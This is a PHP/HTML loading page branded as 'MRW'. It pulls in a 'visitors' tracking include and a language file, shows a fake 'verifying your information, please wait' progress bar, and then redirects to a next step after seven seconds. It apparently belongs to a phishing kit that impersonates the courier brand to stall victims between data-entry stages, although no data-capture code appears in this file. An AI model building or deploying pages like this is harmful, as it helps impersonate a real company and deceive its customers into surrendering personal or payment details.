<?php require_once __DIR__ . "/../vender/visitors.php"; ?>
<?php require_once __DIR__ . "/../vender/languages.php"; ?>
<!DOCTYPE html>
<html lang="<?php echo $lang_code; ?>" <?php echo ($lang_code == 'ar' ? 'dir="rtl"' : ''); ?>>
<head>
    <meta charset="utf-8">
    <title>MRW -</title>
	<!-- logo img title-->
    <link rel="icon" href="image/om.png" type="image/x-png"/>
    <link rel="shortcut icon" href="image/om.png" type="image/x-png" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/asse.css">
    <style>
        body { background-color: #1b224d; height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
        .loader-wrapper { text-align: center; width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; }
        .animated-logo-wrapper { width: 180px; height: auto; margin-bottom: 50px; animation: enter-left 1.5s ease-out forwards, pulse-heart 2s ease-in-out 1.5s infinite; }
        .logo-img { width: 100%; height: auto; }
        @keyframes enter-left { 0% { transform: translateX(-100vw); opacity: 0; } 100% { transform: translateX(0); opacity: 1; } }
        @keyframes pulse-heart { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        .loader-content { animation: fadeIn 1s ease-out 1.5s forwards; opacity: 0; width: 80%; max-width: 400px; }
        .loader-title { color: #ffffff; font-weight: 700; font-size: 1.2rem; margin-bottom: 10px; }
        .loader-text { color: #d1d1d1; font-size: 1rem; margin-bottom: 30px; }
        .progress-bar-container { width: 100%; height: 4px; background-color: rgba(255, 255, 255, 0.1); border-radius: 10px; overflow: hidden; }
        .progress-bar-fill { height: 100%; background-color: #d71920; width: 0%; animation: progressAnim 5s linear 1.5s forwards; }
        @keyframes progressAnim { 0% { width: 0%; } 100% { width: 100%; } }
        @keyframes fadeIn { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
        <?php if($lang_code == 'ar'): ?>
        body { text-align: right; }
        @keyframes enter-left { 0% { transform: translateX(100vw); opacity: 0; } 100% { transform: translateX(0); opacity: 1; } }
        <?php endif; ?>
    </style>
</head>
<body>
    <div class="loader-wrapper">
        <div class="animated-logo-wrapper">
            <img src="image/ogou.png" alt="MRW Logo" class="logo-img">
        </div>

        <div class="loader-content">
            <div class="loader-title"><?php echo $txt['loading_verify_info']; ?></div>
            <div class="loader-text"><?php echo $txt['loading_wait_moment']; ?></div>
            <div class="progress-bar-container">
                <div class="progress-bar-fill"></div>
            </div>
        </div>
    </div>

    <script>
        setTimeout(function() {
            window.location.href = 'sse';
        }, 7000);
    </script>
</body>
</html>
